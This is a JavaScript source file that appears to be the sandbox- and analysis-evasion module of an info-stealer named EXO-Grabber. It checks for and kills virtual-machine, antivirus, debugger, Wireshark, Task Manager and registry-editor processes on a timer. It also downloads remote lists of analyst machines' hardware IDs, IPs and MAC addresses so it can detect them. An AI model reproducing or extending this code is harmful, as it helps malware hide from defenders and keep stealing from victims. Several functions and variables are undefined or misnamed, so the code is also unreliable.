const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const si = require('systeminformation');
const { exec } = require('child_process');
const { execSync } = require('child_process');

async function antivm() {
    const processes = await psList();
    const vmlol = ["vmwareservice", "vmwaretray", "virtualmachine", "sandboxie", "windowssandbox", "joeboxcontrol", "vmwareuser", "vmware", "virtualbox", "hyperv", "zillya", "zillyaservice", "symantec"];

    for (const p of processes) {
        if (vmlol.includes(p.name.toLowerCase())) {
            execSync('taskkill /pid ' + p.pid + ' /f');
            process.exit(0);
        }
    }
}

const killProcesses = (processNames) => {
    const { spawn } = require('child_process');

    for (const name of processNames) {
        spawn('taskkill', ['/F', '/IM', name, '/T']);
    }
};

setInterval(async () => {
    const isAntiDebug = await met();
    if (isAntiDebug) {
        killProcesses([
            "ProcessHacker.exe",
            "httpdebuggerui.exe",
            "wireshark.exe",
            "fiddler.exe",
            "regedit.exe",
            "cmd.exe",
            "taskmgr.exe",
            "vboxservice.exe",
            "df5serv.exe",
            "processhacker.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "ida64.exe",
            "ollydbg.exe",
            "pestudio.exe",
            "vmwareuser.exe",
            "vgauthservice.exe",
            "vmacthlp.exe",
            "vmsrvc.exe",
            "x32dbg.exe",
            "x64dbg.exe",
            "x96dbg.exe",
            "vmusrvc.exe",
            "prl_cc.exe",
            "prl_tools.exe",
            "qemu-ga.exe",
            "joeboxcontrol.exe",
            "ksdumperclient.exe",
            "xenservice.exe",
            "joeboxserver.exe",
            "devenv.exe",
            "IMMUNITYDEBUGGER.EXE",
            "ImportREC.exe",
            "reshacker.exe",
            "windbg.exe",
            "32dbg.exe",
            "64dbg.exex",
            "protection_id.exex",
            "scylla_x86.exe",
            "scylla_x64.exe",
            "scylla.exe",
            "idau64.exe",
            "idau.exe",
            "idaq64.exe",
            "idaq.exe",
            "idaq.exe",
            "idaw.exe",
            "idag64.exe",
            "idag.exe",
            "ida64.exe",
            "ida.exe"
        ]);
    }
}, 1000 * 60 * 5);


const antilists = {
    GPU: [],
    HWID: [],
    IP: [],
    MAC: [],
    'PC Name': [],
};

const ablists = async () => {
    const lists = [
        { name: 'GPU', url: 'https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/gpu_list.txt' },
        { name: 'HWID', url: 'https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/hwid_list.txt' },
        { name: 'IP', url: 'https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/ip_list.txt' },
        { name: 'MAC', url: 'https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/mac_list.txt' },
        { name: 'PC Name', url: 'https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/pc_name_list.txt' },
    ];

    for (const list of lists) {
        try {
            const response = await fetch(list.url);
            if (response.ok) {
                ablists[list.name] = (await response.text()).split('\n').map(x => x.trim()).filter(x => x);
            } else {
            }
        } catch (error) {
        }
    }
};

const condmet = async () => {
    const sysinfo = await si.get({
        system: ['model', 'serial'],
        osInfo: ['hostname', 'ipv4'],
        cpu: ['manufacturer', 'brand', 'speed'],
        bios: ['vendor', 'version'],
        baseboard: ['manufacturer', 'product'],
        graphics: ['controller', 'vram'],
        networkInterfaces: ['mac'],
    });

    const sysinfoList = Object.values(sysinfo).flat();

    for (const listName in antiDebugLists) {
        if (antiDebugLists.hasOwnProperty(listName)) {
            const list = antiDebugLists[listName];
            for (const item of list) {
                if (systemInfoList.includes(item)) {
                    return true;
                }
            }
        }
    }

    return false;
};
